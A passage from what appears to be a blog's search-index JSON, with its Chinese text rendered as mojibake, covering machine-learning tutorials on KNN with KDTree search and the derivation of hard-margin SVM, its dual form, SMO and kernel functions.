L_2(x_i,x_j) = \\sqrt{ \\sum_{l = 1} ^ {n} |x_i^{(l)} - x_j^{(l)}|^2 } $$ æ›¼å“ˆé¡¿è·ç¦» å…¶å®å°±æ˜¯é—µå¯å¤«æ–¯åŸºè·ç¦»çš„ $p = 1$ $$ L_2(x_i,x_j) = \\sum_{l = 1} ^ {n} |x_i^{(l)} - x_j^{(l)}| $$ æ˜¾ç„¶çš„ï¼Œä¸åŒè·ç¦»çš„ k è¿‘é‚»ç‚¹æ˜¯ä¸åŒçš„ã€‚ ","date":"2024-11-28","objectID":"/posts/mlknn/:2:1","tags":["KNN","KDTree"],"title":"KNN","uri":"/posts/mlknn/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"$k$ çš„å¤§å° $k$ è¿‡å°ï¼šå¦‚æœç›¸é‚»ç‚¹æ˜¯å™ªå£°ï¼Œä¼šå½±å“é¢„æµ‹ï¼Œè¿‡æ‹Ÿåˆã€‚ $k$ è¿‡å¤§ï¼šæ¨¡å‹ç®€åŒ–ï¼Œæ¬ æ‹Ÿåˆã€‚ å»ºè®®ä½¿ç”¨ç½‘æ ¼æœç´¢ï¼Œäº¤å‰éªŒè¯ï¼Œé€‰å–ä¸€ä¸ªè¾ƒå°çš„ $k$ å€¼å¼€å§‹ï¼Œä¸æ–­å¢åŠ  $k$ å€¼ï¼Œç„¶åè®¡ç®—æ–¹å·®ã€‚ ","date":"2024-11-28","objectID":"/posts/mlknn/:2:2","tags":["KNN","KDTree"],"title":"KNN","uri":"/posts/mlknn/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"åˆ†ç±»å†³ç­–è§„åˆ™ å¤šæ•°è¡¨å†³æ³•ã€‚ å¯¹äºæ¯ä¸ªç±»åˆ« $c_j \\in \\{ c_1,c_2,\\cdots,c_m \\}$ æ¥è¯´ï¼Œå‡è®¾ $k$ ä¸ªè¿‘é‚»ç‚¹çš„é¢†åŸŸé›†ä¸º $N_k(x)$ï¼Œé‚£ä¹ˆè¾“å‡ºä¸º $$ y = \\argmax_{c_j} \\sum_{x_i \\in N_k(x)} [y_i = c_j] $$ å³å‡ºç°æ¬¡æ•°æœ€å¤šçš„ç±»åˆ«çš„ç±»å°±æ˜¯åˆ†ç±»ç»“æœã€‚ ","date":"2024-11-28","objectID":"/posts/mlknn/:2:3","tags":["KNN","KDTree"],"title":"KNN","uri":"/posts/mlknn/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"KDTree (K-Dimension Tree) å¦‚ä½•æ‰¾ $k$ ä¸ªè¿‘é‚»çš„ç‚¹å‘¢ï¼Ÿå¯ä»¥è€ƒè™‘ä½¿ç”¨ KDTree å®ç°ï¼Œæ²¡é”™è¿™å°±æ˜¯ç®—ç«ä¸­çš„ KDTreeã€‚ å»ºæ ‘ é¦–å…ˆå–ç¬¬ä¸€ç»´ï¼Œæ‰¾åˆ°è¯¥ç»´æ‰€æœ‰ç‚¹çš„ä¸­ä½æ•°ï¼Œé€‰æ‹©è¿™ä¸ªç‚¹ä½œä¸ºæ ¹èŠ‚ç‚¹ï¼Œç„¶åå°†å°äºè¯¥ç»´çš„ç‚¹å½’å…¥å·¦å­æ ‘ï¼Œå…¶ä½™çš„å½’å…¥å³å­æ ‘ (ç›¸å½“äºåˆ†å‰²æˆä¸¤ä¸ªè¶…æ­£æ–¹ä½“) ç»´åº¦å¢åŠ  $1$ å¹¶å–æ¨¡ $k$ï¼Œç»§ç»­å¯¹è¯¥ç»´åšæ­¥éª¤ $1$ å¦‚æ­¤é€’å½’ä¸‹å»ï¼Œå½“åªæœ‰ä¸€ä¸ªç‚¹çš„æ—¶å€™è¿”å›è¯¥ç‚¹ã€‚ ä¸¾ä¸€ä¸ª $k = 2$ çš„ä¾‹å­ã€‚ å»ºå‡ºçš„æ ‘ï¼š è¿™æ ·æ ‘çš„é«˜åº¦æœ€å¤šä¸º $\\log n$ æ’å…¥ ä»æ ¹èŠ‚ç‚¹å¼€å§‹ï¼Œåœ¨æ¯ä¸€ä¸ªèŠ‚ç‚¹å¤„æ ¹æ®åˆ’åˆ†ç»´åº¦çš„åæ ‡çš„ç›¸å¯¹å¤§å°å†³å®šå¾€å·¦è¿˜æ˜¯å¾€å³èµ°ï¼Œç›´è‡³åˆ°è¾¾æŸä¸ªå¶å­èŠ‚ç‚¹ï¼Œç„¶åå°†æ–°ç‚¹æ’å…¥åˆ°è¯¥å¶å­èŠ‚ç‚¹ä¸‹æ–¹å³å¯ã€‚ åˆ é™¤ åˆ é™¤æŸä¸ªèŠ‚ç‚¹æ—¶ï¼Œéœ€è¦é¦–å…ˆå¯¹è¯¥èŠ‚ç‚¹ä¸‹æ–¹å­æ ‘ä¸Šçš„æ‰€æœ‰èŠ‚ç‚¹æ‰“æ•£å¹¶é‡æ–°æ„å»ºæ–°çš„å­æ ‘ï¼Œç„¶åç”¨æ–°å­æ ‘çš„æ ¹èŠ‚ç‚¹æ›¿æ¢è¢«åˆ é™¤çš„èŠ‚ç‚¹ï¼Œå¹¶é‡Šæ”¾è¢«åˆ é™¤èŠ‚ç‚¹çš„å†…å­˜ã€‚ æŸ¥è¯¢ é¦–å…ˆçœ‹ä¸€ä¸‹æœ€è¿‘é‚»çš„æŸ¥è¯¢æ–¹æ³•ã€‚ ä»æ ¹èŠ‚ç‚¹å‡ºå‘ï¼Œé€’å½’å‘ä¸‹è®¿é—®ï¼Œå¦‚æœç›®æ ‡ç‚¹ $x$ çš„å½“å‰ç»´åæ ‡å°äºè®¿é—®ç‚¹çš„åæ ‡ï¼Œåˆ™è®¿é—®å·¦å­æ ‘ï¼Œå¦åˆ™è®¿é—®å³å­æ ‘ï¼Œç›´åˆ°è®¿é—®åˆ°å¶èŠ‚ç‚¹ä¸ºæ­¢ã€‚ å‡è®¾è¯¥å¶èŠ‚ç‚¹ä¸ºæœ€è¿‘ç‚¹ï¼Œä»¥ç›®æ ‡ç‚¹ $x$ ä¸ºåœ†å¿ƒï¼Œç›®æ ‡ç‚¹ $x$ åˆ°å¶èŠ‚ç‚¹çš„è·ç¦»ä¸ºåŠå¾„ç”»ä¸€ä¸ªè¶…çƒã€‚ é€’å½’å‘ä¸Šå›é€€ï¼Œæ·±åº¦éå†æ¯ä¸ªæ ‘ä¸ŠèŠ‚ç‚¹ï¼Œå¦‚æœæ ‘ä¸ŠèŠ‚ç‚¹å¯¹åº”çš„ç‚¹åœ¨è¶…çƒå†…ï¼Œåˆ™æ›´æ–°è¶…çƒçš„åŠå¾„ï¼Œå¦‚æœåœ¨è¶…çƒå¤–ï¼Œç›´æ¥å‰ªæã€‚ æœ€åè¶…çƒä¸Šçš„é‚£ä¸ªç‚¹å°±æ˜¯æœ€è¿‘é‚»ç‚¹ã€‚ é‚£ä¹ˆ $k$ è¿‘é‚»çš„æ–¹æ³•å°±æ˜¯å°†æ‰€æœ‰ç‚¹æ”¾åˆ°ä¸€ä¸ªä¼˜å…ˆé˜Ÿåˆ—é‡Œï¼Œä¼˜å…ˆé˜Ÿåˆ—é‡Œåªå­˜å‰ $k$ è¿‘çš„ç‚¹ï¼Œè¶…çƒåŠå¾„å°±æ˜¯ç›®æ ‡ç‚¹åˆ°æœ€è¿œç‚¹çš„è·ç¦»ï¼Œdfs è¿‡ç¨‹ä¸­ä¾ç„¶è¦å‰ªæã€‚ ","date":"2024-11-28","objectID":"/posts/mlknn/:2:4","tags":["KNN","KDTree"],"title":"KNN","uri":"/posts/mlknn/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"å‚è€ƒ https://zhuanlan.zhihu.com/p/529487972 https://oi-wiki.org/ds/kdt/ https://blog.csdn.net/weixin_39910711/article/details/114447104 https://blog.csdn.net/qq_42688495/article/details/124049811 ç»Ÿè®¡å­¦ä¹ æ–¹æ³•(ç¬¬2ç‰ˆ)æèˆª ","date":"2024-11-28","objectID":"/posts/mlknn/:3:0","tags":["KNN","KDTree"],"title":"KNN","uri":"/posts/mlknn/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"çº¿æ€§å¯åˆ†äºŒåˆ†ç±»æ¨¡å‹ åœ¨äºŒç»´ç©ºé—´ä¸Šï¼Œä¸¤ç±»ç‚¹è¢«ä¸€æ¡ç›´çº¿å®Œå…¨åˆ†å¼€å«åšçº¿æ€§å¯åˆ†ã€‚ è¿˜æ˜¯æ‹¿ä¹‹å‰çš„æ•°æ®é›†ä¸¾ä¾‹ï¼Œ$(x_1, y_1), (x_2,y_2), \\cdots (x_n, y_n)$ï¼Œ$x_i \\in \\textbf{R} ^ d$ï¼Œ$d$ ä¸ºç‰¹å¾å‘é‡ç»´åº¦ã€‚ æ¨¡å‹çš„ç›®æ ‡æ˜¯æ‰¾åˆ°ä¸€æ¡ç›´çº¿ $w x + b = 0$ å¯¹äºæ¯ä¸ª $x_i$ æ»¡è¶³ $$ \\text{sign}(w^\\top x_i + b) = \\begin{cases} 1, y_i = 1 \\\\ -1, y_i = -1 \\end{cases} $$ ä¹Ÿå°±æ˜¯è¯´ $$ \\begin{cases} w^\\top x_i + b \u003e 0, y_i = 1 \\\\ w^\\top x_i + b \u003c 0, y_i = -1 \\end{cases} $$ æˆ‘ä»¬å¯ä»¥å†ç®€åŒ–ä¸€ä¸‹å¼å­ï¼Œæ³¨æ„åˆ° $y_i$ ä¹˜ä»¥ $w^\\top x_i + b$ å§‹ç»ˆå¤§äº $0$ï¼Œæ‰€ä»¥å¼å­è½¬åŒ–ä¸º $y_i(w^\\top x_i + b) \u003e 0$ ","date":"2024-11-11","objectID":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/:1:0","tags":["SVM"],"title":"æ”¯æŒå‘é‡æœº (SVM)","uri":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"æœ€å¤§åŒ–é—´éš” æˆ‘ä»¬éœ€è¦æ‰¾åˆ°è¿™æ¡ç›´çº¿å°†æ­£è´Ÿæ ·æœ¬åˆ’åˆ†å¼€æ¥ï¼Œç„¶åæ ·æœ¬åˆ°ç›´çº¿çš„è·ç¦»å¿…é¡»éƒ½è¦æœ€è¿œã€‚ ","date":"2024-11-11","objectID":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/:1:1","tags":["SVM"],"title":"æ”¯æŒå‘é‡æœº (SVM)","uri":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"æ”¯æŒå‘é‡ æ­£è´Ÿæ ·æœ¬ä¸­è·ç¦»è¶…å¹³é¢æœ€è¿‘çš„ä¸€äº›ç‚¹ï¼Œè¿™äº›ç‚¹å«åšæ”¯æŒå‘é‡ã€‚ ","date":"2024-11-11","objectID":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/:1:2","tags":["SVM"],"title":"æ”¯æŒå‘é‡æœº (SVM)","uri":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"æœ€ä¼˜åŒ– æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ”¯æŒå‘é‡åˆ°åˆ’åˆ†è¶…å¹³é¢çš„è·ç¦»æœ€å¤§ã€‚ è€ƒè™‘ç‚¹åˆ°è¶…å¹³é¢çš„è·ç¦» $\\dfrac{|w^\\top x + b|}{||w||}$ æ ¹æ®æ”¯æŒå‘é‡åˆ°è¶…å¹³é¢çš„è·ç¦»ä¸º $d$ï¼Œå…¶ä»–ç‚¹åˆ°è¶…å¹³é¢çš„è·ç¦»å¤§äº $d$ æˆ‘ä»¬æœ‰ï¼š $$ \\begin{cases} \\dfrac{1}{||w||} (w^\\top x_i + b) \\ge d, y_i = 1 \\\\ \\dfrac{1}{||w||} (w^\\top x_i + b) \\le -d, y_i = -1 \\end{cases} $$ æŠŠ $d$ é™¤è¿‡å»ï¼š $$ \\begin{cases} \\dfrac{1}{||w||d} (w^\\top x_i + b) \\ge 1, y_i = 1 \\\\ \\dfrac{1}{||w||d} (w^\\top x_i + b) \\le -1, y_i = -1 \\end{cases} $$ ä»¤è¿™ä¸€å¨ $\\dfrac{1}{||w||d}$ ä¸º $1$ (æ–¹ä¾¿æ¨å¯¼ï¼Œä¸”å¯¹ç›®æ ‡å‡½æ•°æ— å½±å“) å¾—åˆ°ï¼š $$ \\begin{cases} w^\\top x_i + b \\ge 1, y_i = 1 \\\\ w^\\top x_i + b \\le -1, y_i = -1 \\end{cases} $$ å¼å­ç®€åŒ–ä¸º $y_i (w^\\top x_i + b) \\ge 1$ å«ä¹‰å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å›é¡¾æˆ‘ä»¬è¦æœ€å¤§åŒ–çš„ç›®æ ‡ $\\dfrac{|w^\\top x_i + b|}{||w||}$ï¼Œç”±äº $y_i (w^\\top x_i + b) \\ge 1$ï¼Œé‚£ä¹ˆ $y_i (w^\\top x_i + b) = |w^\\top x_i + b|$ï¼Œç„¶ååªè€ƒè™‘æ”¯æŒå‘é‡ï¼Œé‚£ä¹ˆ $y_i (w^\\top x_i + b) = 1$ï¼Œå†ä¸ºäº†æ¨å¯¼æ–¹ä¾¿ï¼Œæˆ‘ä»¬å°†å¼å­æ•´ä½“ä¹˜ $2$ (æ— å½±å“)ï¼ŒåŸå¼å˜ä¸º $\\max \\dfrac{2}{||w||}$ï¼Œç›¸å½“äº $\\min \\dfrac{||w||}{2}$ï¼Œç„¶åæˆ‘ä»¬æŠŠ $||w||$ åŠ ä¸€ä¸ªå¹³æ–¹ï¼Œå› ä¸º $x ^ 2$ å•è°ƒ (æŒ‡å¤§äº $0$ æ—¶)ä¸å½±å“æœ€å°å€¼ç‚¹ï¼Œå¼å­å˜ä¸º $$ \\min \\frac{1}{2} ||w|| ^ 2 \\\\ \\text{s.t.} \\ y_i (w^\\top x_i + b) \\ge 1 $$ è¿™å°±æ˜¯ç¡¬é—´éš”çº¿æ€§ SVM ","date":"2024-11-11","objectID":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/:1:3","tags":["SVM"],"title":"æ”¯æŒå‘é‡æœº (SVM)","uri":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"å¯¹å¶å‹ æ¥ä¸‹æ¥è€ƒè™‘å¯¹å¶å‹ã€‚ ","date":"2024-11-11","objectID":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/:2:0","tags":["SVM"],"title":"æ”¯æŒå‘é‡æœº (SVM)","uri":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"KKT æ¡ä»¶ è¦å…ˆå¼•å…¥ä¸€ä¸ªæ–¹æ³•å°±æ˜¯ KKT æ¡ä»¶ã€‚ é¦–å…ˆçœ‹ä¸€ä¸ªåŒæ—¶å«æœ‰ç­‰å¼å’Œä¸ç­‰å¼çº¦æŸçš„å¤šå…ƒå‡½æ•°æå€¼ã€‚ $$ \\begin{aligned} \\min_u\\ \u0026f(u) \\\\ \\text{s.t.} \\ \u0026 g_i(u) \\le 0, \u0026 i = 1,2,\\cdots,m \\\\ \u0026 h_j(u) = 0, \u0026 j = 1,2,\\cdots, n \\end{aligned} $$ å¯¹äºç­‰å¼ç›´æ¥æ‹‰æ ¼æœ—æ—¥ä¹˜æ•°æ³•æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œé‡ç‚¹å…³æ³¨ä¸€ä¸‹ä¸ç­‰å¼ã€‚ æˆ‘ä»¬å‡è®¾ç›®æ ‡å‡½æ•°ä¸º $L(u, \\alpha, \\beta) = f(u) + \\sum\\limits_{i = 1} ^ {m} \\alpha_i g_i(u) + \\sum\\limits_{j = 1} ^ {n} \\beta_jh_j(u)$ å¯¹äºä¸ç­‰å¼æ¥è¯´ï¼Œæœ‰ $g(u) \u003c 0$ å’Œ $g(u) = 0$ ä¸¤ç§æƒ…å†µã€‚ å½“ $g(u) \u003c 0$ æ—¶ï¼Œç›¸å½“äºæ­¤æ¡ä»¶ä½œåºŸï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰é™åˆ¶æ¡ä»¶äº†ï¼Œçº¦æŸå‡½æ•°ä¸èµ·ä½œç”¨ï¼Œé‚£ä¹ˆæ­¤æ—¶ç›¸å½“äº $\\alpha = 0$ å½“ $g(u) = 0$ æ—¶ï¼Œç›¸å½“äºæ˜¯ç­‰å¼çš„æƒ…å†µäº†ï¼Œå¯è¡Œè§£ $u ^ *$ æ»¡è¶³ $\\nabla f(u ^ *) = -\\alpha \\nabla g(u ^ *)$ï¼Œä¸”æ¢¯åº¦æ–¹å‘ç›¸åä¸”å¹³è¡Œï¼Œæ‰€ä»¥ $\\alpha \u003e 0$ å¦‚ä¸‹å›¾æ‰€ç¤º ($u$ æ›¿æ¢ä¸º $x$)ï¼š ç»¼ä¸Šæ‰€è¿°ï¼Œæ»¡è¶³ $\\alpha_i^* g(u*) = 0$ï¼Œç§°ä½œäº’è¡¥æ¾å¼›ã€‚ ","date":"2024-11-11","objectID":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/:2:1","tags":["SVM"],"title":"æ”¯æŒå‘é‡æœº (SVM)","uri":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"çº¦æŸé—®é¢˜è½¬æ¢ä¸º min max æ‹‰æ ¼æœ—æ—¥å‡½æ•° çº¦æŸé—®é¢˜ç­‰ä»·äº $$ \\begin{aligned} \\min_u \\max_{\\alpha, \\beta}\\ \u0026 L(u, \\alpha, \\beta) \\\\ \\text{s.t.} \\ \u0026 \\alpha_i \\ge 0, \u0026 i = 1,2,\\cdots,m \\end{aligned} $$ è¯æ˜ï¼š åŸå¼ä¸º $$ \\min_u \\max_{\\alpha, \\beta} \\left(f(u) + \\sum_{i = 1} ^ {m} \\alpha_i g_i(u) + \\sum_{j = 1} ^ {n} \\beta_jh_j(u) \\right) $$ $f(u)$ æ— å…³ï¼Œå°† $\\max_{\\alpha, \\beta}$ æ‹¿è¿›å» $$ \\min_u \\left(f(u) + \\max_{\\alpha, \\beta} \\left(\\sum_{i = 1} ^ {m} \\alpha_i g_i(u) + \\sum_{j = 1} ^ {n} \\beta_jh_j(u) \\right) \\right) $$ å¦‚æœ $u$ ä¸æ»¡è¶³çº¦æŸï¼Œé‚£ä¹ˆ $g_i(u) \u003e 0$ï¼Œç”±äºçº¦æŸ $\\alpha_i \\ge 0$ï¼Œå¯ä»¥å– $\\alpha_i = \\infty$ï¼Œä½¿å¾—å¼å­ä¸º $\\infty$ å¦‚æœ $u$ ä¸æ»¡è¶³ç­‰å¼çº¦æŸï¼Œå³ $h_j(u) \\ne 0$ï¼Œç”±äº $\\beta_j$ æ²¡æœ‰æ­£è´Ÿé™åˆ¶ï¼Œå¯ä»¥å– $\\beta_j = \\text{sign}(h_j(u)) = \\infty$ å¦‚æœ $u$ æ»¡è¶³çº¦æŸï¼Œé‚£ä¹ˆ $\\alpha_i \\ge 0, \\alpha_i g(u) \\le 0$ï¼Œä¸” $\\beta_jh_j(u) = 0$ï¼Œå¼å­ç»“æœä¸º $0$ æ‰€ä»¥è½¬åŒ–ä¸º $$ \\min_u \\left(f(u) + \\begin{cases}0, \\forall i,j \\ g_i(u) \\le 0, h_j(u) = 0\\\\ \\infty, \\text{else}\\end{cases} \\right) $$ åˆ†é… $\\min$ $$ \\min_u f(u) + \\min_u\\begin{cases}0, \\forall i,j \\ g_i(u) \\le 0, h_j(u) = 0\\\\ \\infty, \\text{else}\\end{cases} $$ ç­‰ä»·äº $\\min_u f(u)$ï¼Œä¸” $u$ æ»¡è¶³çº¦æŸã€‚ äº¤æ¢ min max ç”±äºç¡¬é—´éš”çº¿æ€§ SVM æ»¡è¶³ Slater æ¡ä»¶ (https://www.cnblogs.com/guanyang/p/16287060.html)ï¼Œæ‰€ä»¥å¯ä»¥äº¤æ¢ min max ç­‰ä»·ï¼š $$ \\min_u \\max_{\\alpha, \\beta}\\ L(u, \\alpha, \\beta) = \\max_{\\alpha, \\beta} \\min_u \\ L(u, \\alpha, \\beta) $$ ","date":"2024-11-11","objectID":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/:2:2","tags":["SVM"],"title":"æ”¯æŒå‘é‡æœº (SVM)","uri":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"å¯¹å¶é—®é¢˜ å›é¡¾ä¸€ä¸‹åŸå§‹é—®é¢˜ $$ \\min \\frac{1}{2} ||w|| ^ 2 \\\\ \\text{s.t.} \\ 1 - y_i (w^\\top x_i + b) \\le 0 $$ è¯¥é—®é¢˜æ²¡æœ‰ç­‰å¼çº¦æŸï¼Œé‚£ä¹ˆå®šä¹‰æ‹‰æ ¼æœ—æ—¥å‡½æ•°ä¸º $L(w, b, \\alpha) = \\dfrac{1}{2} ||w||^2 + \\sum\\limits_{i = 1} ^ {m} \\alpha_i(1 - y_i (w^\\top x_i + b))$ æ ¹æ®å¯¹å¶æ€§è½¬æ¢ä¸º $$ \\max_\\alpha \\min_{w, b} \\ L(w, b, \\alpha) \\\\ \\text{s.t.} \\ \\alpha_i \\ge 0, i = 1, 2, \\cdots, m $$ å…ˆè€ƒè™‘é‡Œé¢çš„ $\\min\\limits_{w, b} \\ L(w, b, \\alpha)$ï¼Œæˆ‘ä»¬ç›´æ¥å¯¹ $w, b$ æ±‚åå¯¼ä»¤æˆ $0$ï¼š $$ \\begin{aligned} \\frac{\\partial L}{\\partial w} \u0026= 0 \\\\ w - \\sum_{i = 1} ^ m \\alpha_i x_i y_i \u0026= 0 \\\\ \\sum_{i = 1} ^ m \\alpha_i x_i y_i \u0026= w \\end{aligned} $$ è§£å¾—æœ€ä¼˜å€¼ $w ^ * = \\sum\\limits_{i = 1} ^ m\\alpha_i x_i y_i$ï¼Œæ¥ä¸‹æ¥å¯¹ $b$ åå¯¼ï¼š $$ \\begin{aligned} \\frac{\\partial L}{\\partial b} \u0026= 0 \\\\ \\sum_{i = 1} ^ m\\alpha_i y_i \u0026= 0 \\end{aligned} $$ å¾—åˆ°äº†ä¸€ä¸ªç­‰å¼ $\\sum\\limits_{i = 1} ^ m\\alpha_i y_i = 0$ æˆ‘ä»¬å°†ä¸¤ä¸ªåå¯¼ç»“æœå¸¦å…¥åˆ°åŸå¼ï¼š $$ \\begin{aligned} L(w ^ *, b ^ *, \\alpha) \u0026= \\frac{1}{2} ||w ^ *||^2 + \\sum_{i = 1} ^ {m} \\alpha_i(1 - y_i(w^\\top x_i + b)) \\\\ \u0026= \\frac{1}{2} ||w ^ *||^2 + \\sum_{i = 1} ^ {m} \\alpha_i - \\sum_{i = 1} ^ {m} \\alpha_i y_i w^\\top x_i - \\sum_{i = 1} ^ {m} \\alpha_i y_i b \\\\ \u0026= \\frac{1}{2} ||w ^ *||^2 + \\sum_{i = 1} ^ {m} \\alpha_i - ||w ^ *|| ^ 2 - b \\times 0 \\\\ \u0026= -\\frac{1}{2} ||w ^ *||^2 + \\sum_{i = 1} ^ {m} \\alpha_i \\\\ \u0026= -\\frac{1}{2} \\left(\\sum\\limits_{i = 1} ^ m\\alpha_i x_i y_i\\right) \\left(\\sum\\limits_{j = 1} ^ m\\alpha_j x_j y_j\\right) + \\sum_{i = 1} ^ {m} \\alpha_i \\\\ \u0026= -\\frac{1}{2} \\sum\\limits_{i = 1} ^ m \\sum\\limits_{j = 1} ^ m \\alpha_i \\alpha_j x_i x_j y_i y_j + \\sum_{i = 1} ^ {m} \\alpha_i \\end{aligned} $$ ç„¶åé—®é¢˜å˜ä¸ºï¼š $$ \\max_\\alpha \\left(-\\frac{1}{2} \\sum\\limits_{i = 1} ^ m \\sum\\limits_{j = 1} ^ m \\alpha_i \\alpha_j x_i x_j y_i y_j + \\sum_{i = 1} ^ {m} \\alpha_i\\right) \\\\ \\text{s.t.} \\ \\alpha_i \\ge 0, i = 1, 2, \\cdots, m \\\\ \\sum_{i = 1} ^ m\\alpha_i y_i = 0 $$ åŠ ä¸ªè´Ÿå·å˜æˆ $\\min$ï¼š $$ \\min_\\alpha \\left(\\frac{1}{2} \\sum\\limits_{i = 1} ^ m \\sum\\limits_{j = 1} ^ m \\alpha_i \\alpha_j x_i x_j y_i y_j - \\sum_{i = 1} ^ {m} \\alpha_i\\right) \\\\ \\text{s.t.} \\ \\alpha_i \\ge 0, i = 1, 2, \\cdots, m \\\\ \\sum_{i = 1} ^ m\\alpha_i y_i = 0 $$ è¿™å°±æ˜¯ç¡¬é—´éš”çº¿æ€§ SVM çš„å¯¹å¶å‹ã€‚ ","date":"2024-11-11","objectID":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/:2:3","tags":["SVM"],"title":"æ”¯æŒå‘é‡æœº (SVM)","uri":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"SMO ç®—æ³• è¿™æ˜¯ä¸€ä¸ªäºŒæ¬¡è§„åˆ’é—®é¢˜ï¼Œå¯ä»¥ç”¨ SMO(Sequential Minimal Optimization) å³åºåˆ—æœ€å°ä¼˜åŒ–ç®—æ³•æ±‚è§£ã€‚ SMO æ ¸å¿ƒæ€æƒ³æ˜¯æ¯æ¬¡åªä¼˜åŒ–ä¸€ä¸ªå‚æ•°ï¼Œå…¶ä»–å›ºå®šã€‚ä½†æ˜¯æˆ‘ä»¬è¿™é‡Œæœ‰ $\\sum\\limits_{i = 1} ^ m\\alpha_i y_i = 0$ï¼Œå¦‚æœæˆ‘ä»¬ä¼˜åŒ–å…¶ä¸­ä¸€ä¸ª $\\alpha_i$ï¼Œå…¶ä»–å›ºå®šï¼Œé‚£ä¹ˆ $\\alpha_i$ ä¹Ÿæˆå®šå€¼äº†ã€‚ æ‰€ä»¥æˆ‘ä»¬è€ƒè™‘å›ºå®šä½ä¸¤ä¸ªå‚æ•° $\\alpha_i, \\alpha_j$ï¼Œçº¦æŸå˜ä¸º $$ \\alpha_i y_i + \\alpha_j y_j = C \\\\ C = -\\sum_{k \\ne i,j} \\alpha_k y_k $$ ç”±æ­¤å¾—å‡º $\\alpha_j = \\dfrac{C - \\alpha_i y_i}{y_j}$ï¼Œæˆ‘ä»¬å¸¦å…¥åŸå¼ï¼Œå°±å¾—åˆ°äº†åªå«æœ‰ä¸€ä¸ª $\\alpha_i$ å˜é‡çš„å¼å­ï¼Œç›´æ¥å¯¹ $\\alpha_i$ æ¢¯åº¦ä¸‹é™ã€‚ä¹‹åå†é€‰ä¸€ä¸ªæ–°çš„å˜é‡å³å¯ã€‚ å®Œäº‹ä¹‹åæ ¹æ®å¼å­ $w = \\sum\\limits_{i = 1} ^ m\\alpha_i x_i y_i$ å¯ä»¥æ±‚å‡º $w$ï¼Œå†æ ¹æ® $y_i(w^\\top x_i + b) = 1$ æ±‚å‡º $b$ï¼Œå¯ä»¥æŠŠæ¯ä¸ªæ”¯æŒå‘é‡å¸¦è¿›å»æ±‚ä¸€ä¸ª $b$ çš„å¹³å‡å€¼ã€‚ ","date":"2024-11-11","objectID":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/:2:4","tags":["SVM"],"title":"æ”¯æŒå‘é‡æœº (SVM)","uri":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"æ ¸å‡½æ•° å‡è®¾ç°åœ¨æ˜¯ä¸€ä¸ªçº¿æ€§ä¸å¯åˆ†çš„æ ·æœ¬ã€‚ æˆ‘ä»¬å¯ä»¥æŠŠç‰¹å¾æ˜ å°„åˆ°æ›´é«˜ç»´åº¦ã€‚è¿™æ ·åœ¨é«˜ç»´å°±çº¿æ€§å¯åˆ†äº†ã€‚ å¤„ç†æ–¹å¼æ˜¯å°† $x_i, x_j$ å˜ä¸º $\\Phi(x_i), \\Phi(x_j)$ï¼Œæˆ‘ä»¬æŠŠæ ¸å‡½æ•°å†™åš $K(x_i, x_j)$ $$ \\min_\\alpha \\left(\\frac{1}{2} \\sum\\limits_{i = 1} ^ m \\sum\\limits_{j = 1} ^ m \\alpha_i \\alpha_j \\Phi(x_i) \\Phi(x_j) y_i y_j - \\sum_{i = 1} ^ {m} \\alpha_i\\right) \\\\ \\text{s.t.} \\ \\alpha_i \\ge 0, i = 1, 2, \\cdots, m \\\\ \\sum_{i = 1} ^ m\\alpha_i y_i = 0 $$ ","date":"2024-11-11","objectID":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/:3:0","tags":["SVM"],"title":"æ”¯æŒå‘é‡æœº (SVM)","uri":"/posts/ml%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"å¸¸è§çš„æ ¸å‡½æ•° çº¿æ€§æ ¸å‡½æ•° $$ K(x_i, x_j) = x_i ^ \\top x_j $$ å¤šé¡¹å¼æ ¸å‡½æ•° $$ K(x_i, x_j) = (\\gamma x_i ^ \\top x_j + b) ^ d $$ é«˜æ–¯æ 